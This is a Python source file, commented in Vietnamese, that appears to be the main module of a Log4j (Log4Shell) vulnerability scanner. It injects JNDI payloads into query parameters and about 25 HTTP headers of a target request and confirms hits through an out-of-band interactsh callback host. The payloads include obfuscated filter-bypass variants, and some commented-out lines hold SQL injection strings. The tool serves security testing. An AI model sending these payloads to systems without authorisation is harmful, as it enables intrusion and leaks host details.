import requests
from Interactsh import interactsh
from Util import util
from UserInteraction import userInteraction
from Result import result
from Scanner import scanner

# Tắt cảnh báo liên quan tới SSL
requests.packages.urllib3.disable_warnings()
# Biến cấu hình toàn cục proxy
HTTP_PROXY = {
}
# Biến chứ giá trị interact url nếu người dùng sử dụng vector tấn công liên quan tới out-of-band
interact_url = None
# Số request được gửi đi trong một lần
thread = 10
# URL của request để scan
url = None
# Đường dẫn file chưa request nếu người dùng sử dụng option -f
requestFilePath = None
# Object <class '_io.TextIOWrapper'>, sẽ có giá trị khi người dùng sử dụng option -o --output-file
outputFile = None
# Kiểm tra người dùng có sử dụng vector liên quan tới out-of-band hay không (option -oob)
isOOBVector = False
# Kiểm tra người dùng có sử dụng tính năng thêm payload vào tất cả header hay không (option -ah, --all-headers)
injectAllHeader = False
# Danh sách chế độ scan
modeList = {
    "1": "injectAll",
    "2": "injectAllSequently",
    "3": "injectToSpecificParams"
}
# Chế độ scan người dùng chọn (option -m), để biết chi tiết mỗi mode dùng option -h, --help
mode = "2"
# Những header sẽ không bị đưa vào biến dict defaultHeader trong quá trình tool chạy để tránh bị lặp header mặc định có trong mỗi request.
notAffectedHeader = ["connection", "content-length", "host", "accept", "accept-encoding", "accept-language"]
# Những header sẽ không bị tiêm payload vào trong lúc tool load các payload vào các param trong request.
excludedHeader = ["connection", "content-length", "host", "accept", "accept-encoding", "accept-language"]
# Check method là get hay post
isGetMethod = True
# Biến chứa param và value trên url
query = None
# Biến chứa danh sách header mà người dùng cung cấp trong request
headerDict = None
# Biến chứa data trong body request người dùng cung cấp
reqBody = None
# Kiểm tra kích hoạt chế độ xem danh sách payload trước khi scan (option -v)
verboseInf = False
# Biến chứa object Util khi được khởi tạo
myUtil = None
# Biến kiểm tra người dùng cung cấp interact url cho các vector tấn công oob (option --interact-server, -is)
isCustomInteractServer = False
# Danh sách các vector scan
scanList = {
    "1": "Log4j",
    "2": "Fuzzing Path",
    "3": "Only Inject Payload"
}
# Chế độ scan người dùng chọn (option -sm), để biết chi tiết mỗi mode dùng option -h, --help
scanMode = "3"
# Các payloads mặc định của tool, tên payload và paload
payloads = {
    # "ORACLE_SQLi_DNS_1": """(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM "http://__BURP_COLLABORATOR__/">%ceqxd;]>'),'/l') from dual)""",
    # "MSACCESS_Check_Type_2": """' and cdbl(1)=cdbl(1)""",
    # "log4j_cve1": """${jndi:ldap://${hostName}.__interactsh_url__/a}""",
    # "log4j_cve2": """${jndi:ldap://${hostName}.accept.__interactsh_url__}""",
    # "log4j_cve3": """${jndi:ldap://${hostName}.acceptencoding.__interactsh_url__}""",
    # "log4j_cve4": """${jndi:ldap://${hostName}.acceptlanguage.__interactsh_url__}""",
    # "log4j_cve5": """${jndi:ldap://${hostName}.accesscontrolrequestheaders.__interactsh_url__}""",
    # "log4j_cve6": """${jndi:ldap://${hostName}.accesscontrolrequestmethod.__interactsh_url__}""",
    # "log4j_cve7": """${jndi:ldap://${hostName}.authenticationbasic.__interactsh_url__}""",
    # "log4j_cve8": """${jndi:ldap://${hostName}.authenticationbearer.__interactsh_url__}""",
    # "log4j_cve9": """${jndi:ldap://${hostName}.cookiename.__interactsh_url__}=${jndi:ldap://${hostName}.cookievalue.__interactsh_url__}""",
    # "log4j_cve10": """${jndi:ldap://${hostName}.location.__interactsh_url__}""",
    # "log4j_cve11": """${jndi:ldap://${hostName}.origin.__interactsh_url__}""",
    # "log4j_cve12": """${jndi:ldap://${hostName}.referer.__interactsh_url__}""",
    # "log4j_cve13": """${jndi:ldap://${hostName}.upgradeinsecurerequests.__interactsh_url__}""",
    # "log4j_cve14": """${jndi:ldap://${hostName}.useragent.__interactsh_url__}""",
    # "log4j_cve15": """${jndi:ldap://${hostName}.xapiversion.__interactsh_url__}""",
    # "log4j_cve16": """${jndi:ldap://${hostName}.xcsrftoken.__interactsh_url__}""",
    # "log4j_cve17": """${jndi:ldap://${hostName}.xdruidcomment.__interactsh_url__}""",
    # "log4j_cve18": """${jndi:ldap://${hostName}.xforwardedfor.__interactsh_url__}""",
    # "log4j_cve19": """${jndi:ldap://${hostName}.xorigin.__interactsh_url__}""",
    # "log4j_cve20" : """${jndi:ldap://${hostName}.__interactsh_url__/a}""",
    # "log4j_cve21" : """${jndi:ldap://127.0.0.1#.${hostName}.__interactsh_url__/a}""",
    "log4j_cve11": """${jndi:ldap://${hostName}.origin.__param__.__interactsh_url__}""",
    # "log4j_cve12": """${jndi:ldap://${hostName}.referer.__interactsh_url__}""",
    # "log4j_cve13": """${jndi:ldap://${hostName}.upgradeinsecurerequests.__interactsh_url__}""",
    # "log4j_cve14": """${jndi:ldap://${hostName}.useragent.__interactsh_url__}""",
    # "log4j_cve15": """${jndi:ldap://${hostName}.xapiversion.__interactsh_url__}""",
    # "log4j_cve16": """${jndi:ldap://${hostName}.xcsrftoken.__interactsh_url__}""",
    # "log4j_cve17": """${jndi:ldap://${hostName}.xdruidcomment.__interactsh_url__}""",
    # "log4j_cve18": """${jndi:ldap://${hostName}.xforwardedfor.__interactsh_url__}""",
    # "log4j_cve19": """${jndi:ldap://${hostName}.xorigin.__interactsh_url__}""",
    # "log4j_cve20" : """${jndi:ldap://${hostName}.__interactsh_url__/a}""",
    # "log4j_cve21" : """${jndi:ldap://127.0.0.1#.${hostName}.__param__.__interactsh_url__/a}""",
    "log4j_cve22" : """${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.__param__.__interactsh_url__/a}""",
    # "log4j_cve23" : """${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.__param__.__interactsh_url__/a}"""
    # "log4j_cve1": """${jndi:ldap://${hostName}.__interactsh_url__/a}""",
    # "log4j_cve2": """${jndi:ldap://${hostName}.accept.__interactsh_url__}""",
    # "log4j_cve3": """${jndi:ldap://${hostName}.acceptencoding.__interactsh_url__}""",
    # "log4j_cve4": """${jndi:ldap://${hostName}.acceptlanguage.__interactsh_url__}""",
    # "log4j_cve5": """${jndi:ldap://${hostName}.accesscontrolrequestheaders.__interactsh_url__}""",
    # "log4j_cve6": """${jndi:ldap://${hostName}.accesscontrolrequestmethod.__interactsh_url__}""",
    # "log4j_cve7": """${jndi:ldap://${hostName}.authenticationbasic.__interactsh_url__}""",
    # "log4j_cve8": """${jndi:ldap://${hostName}.authenticationbearer.__interactsh_url__}""",
    # "log4j_cve9": """${jndi:ldap://${hostName}.cookiename.__interactsh_url__}=${jndi:ldap://${hostName}.cookievalue.__interactsh_url__}""",
    # "log4j_cve10": """${jndi:ldap://${hostName}.location.__interactsh_url__}""",
    # "log4j_cve22" : """${jndi:dns://${whoami}.__param__.__interactsh_url__}"""
}

# Các header mặc định sẽ được nạp nếu người dùng xử dụng option add tất cả header vào request (--all-headers, -a)
defaultHeader = {
    "User-Agent": "__PAYLOAD__",
    "X-Forwarded-For": "__PAYLOAD__",
    "X-Api-Version": "__PAYLOAD__",
    "X-Real-Ip": "__PAYLOAD__",
    "Via": "1.1 __PAYLOAD__",
    "X-Wap-Profile": "http://__PAYLOAD__",
    "Proxy": "http://__PAYLOAD__",
    "Forwarded": "__PAYLOAD__",
    "X-Host": "__PAYLOAD__",
    "Destination": "__PAYLOAD__",
    "Referer": "http://__PAYLOAD__",
    "X-Originating-Ip": "__PAYLOAD__",
    "X-Arbitrary": "http://__PAYLOAD__",
    "True-Client-Ip": "__PAYLOAD__",
    "Client-Ip": "__PAYLOAD__",
    "X-Original-Url": "http://__PAYLOAD__",
    "From": "root@__PAYLOAD__",
    "X-Http-Destinationurl": "http://__PAYLOAD__",
    "X-Forwarded-Server": "__PAYLOAD__",
    "Profile": "http://__PAYLOAD__",
    "X-Client-Ip": "__PAYLOAD__",
    "Contact": "__PAYLOAD__",
    "Proxy-Host": "__PAYLOAD__",
    "Cf-Connecting_ip": "__PAYLOAD__",
    "X-Forwarded-Proto": "http://__PAYLOAD__"
}

# Hàm nên gọi sau mỗi API được scan để các biến global cần thiết được reset lại None cho việc scan các API tiếp theo
def restartGlobalVariable(tempPayload, tempDefaultHeader):
    global url, isGetMethod, query, headerDict, reqBody, defaultHeader, payloads
    url = None
    isGetMethod = True
    query = None
    headerDict = None
    reqBody = None
    payloads = tempPayload.copy()
    defaultHeader = tempDefaultHeader.copy()

# Hàm cập nhật giá trị của các biến config global như trên sau khi phân tích option người dùng.
def updateConfig():
    global requestFilePath, isGetMethod, headerDict, reqBody, url, query, interact_url, thread, HTTP_PROXY, excludedHeader, outputFile, verboseInf, isOOBVector, injectAllHeader, defaultHeader, payloads, myUtil, mode, notAffectedHeader, isCustomInteractServer
    userInteract = userInteraction()
    userInteract.argument()
    configList = userInteract.argumentHandling(thread, excludedHeader, defaultHeader, payloads, mode, notAffectedHeader)
    # len(configList) == 18 xảy ra khi người dùng không sử dụng option cung cấp request bằng file (-u thay vì -f)
    if len(configList) == 17:
        isGetMethod, headerDict, reqBody, url, query, interact_url, thread, HTTP_PROXY, excludedHeader, outputFile, verboseInf, isOOBVector, \
        injectAllHeader, defaultHeader, payloads, myUtil, mode = configList
    # len(configList) == 13 xảy ra khi người dùng sử dụng option cung cấp request bằng file (-f)
    elif len(configList) == 13:
        requestFilePath, interact_url, thread, HTTP_PROXY, excludedHeader, outputFile, verboseInf, isOOBVector, injectAllHeader, defaultHeader, payloads, myUtil, mode = configList
    if interact_url:
        isCustomInteractServer = True

# Thứ tự các hàm được gọi khi scan
def scanFlow():
    global requestFilePath, isGetMethod, headerDict, reqBody, url, query, interact_url, thread, HTTP_PROXY, excludedHeader, outputFile, verboseInf, \
        isOOBVector, injectAllHeader, defaultHeader, payloads, myUtil, mode, notAffectedHeader, isCustomInteractServer
    # Điều kiện xảy ra khi người dùng sử dụng option cung cấp request bằng file
    if requestFilePath:
        requestList = myUtil.getMultiRequest(requestFilePath)
        tempPayload = payloads.copy()
        tempDefaultHeader = defaultHeader.copy()
        for request in requestList:
            restartGlobalVariable(tempPayload, tempDefaultHeader)
            isGetMethod, query, headerDict, reqBody, url = myUtil.analystRequest(request, defaultHeader, notAffectedHeader, excludedHeader)
            myUtil.showRequestConfig(query, isGetMethod, headerDict, reqBody, url, myUtil)
            if isOOBVector:
                if not isCustomInteractServer:
                    interact = interactsh(HTTP_PROXY, myUtil)
                    interact_url = interact.register()
                payloads = myUtil.replaceUrlPayload(interact_url, payloads)
            scanTool = scanner(mode, modeList, payloads, util, reqBody, defaultHeader, query, headerDict, injectAllHeader, excludedHeader)
            dataReqList = scanTool.scanLog4j()
            myUtil.runner(dataReqList, thread, isGetMethod, url, HTTP_PROXY)
            if isOOBVector and not isCustomInteractServer:
                data, aes_key = interact.pollData()
                if not data and not aes_key:
                    continue
                key = interact.decryptAESKey(aes_key)
                dataList = interact.decryptMessage(key, data)
                resultLog4j = result(resposne=None, dataOOB=dataList, util=myUtil)
                resultLog4j.parsedDataOOB()

    # Điều kiện xảy ra khi người dùng không sử dụng option cung cấp request bằng file (-u thay vì -f)
    else:
        myUtil.showRequestConfig(query, isGetMethod, headerDict, reqBody, url, myUtil)
        if isOOBVector:
            if not isCustomInteractServer:
                interact = interactsh(HTTP_PROXY, myUtil)
                interact_url = interact.register()
            payloads = myUtil.replaceUrlPayload(interact_url, payloads)

        scanTool = scanner(mode, modeList, payloads, util, reqBody, defaultHeader, query, headerDict, injectAllHeader, excludedHeader)
        dataReqList = scanTool.scanLog4j()
        myUtil.runner(dataReqList, thread, isGetMethod, url, HTTP_PROXY)

        if isOOBVector and not isCustomInteractServer:
            data, aes_key = interact.pollData()
            if aes_key:
                key = interact.decryptAESKey(aes_key)
                dataList = interact.decryptMessage(key,data)
                resultLog4j = result(resposne = None, dataOOB = dataList, util = myUtil)
                resultLog4j.parsedDataOOB()


def main():
    global outputFile
    updateConfig()
    myUtil.loadIntro()
    myUtil.showCurrentConfig(HTTP_PROXY, mode, requestFilePath, excludedHeader, verboseInf, thread, payloads, myUtil)
    scanFlow()
    # Điều kiện xảy ra khi dùng option lưu output vào file (-o --output-file), code dưới dùng để đóng file trước khi tool scan kết thúc.
    if outputFile:
        outputFile = myUtil.updateOutputFileVar()
        outputFile.close()

if __name__ == "__main__":
    main()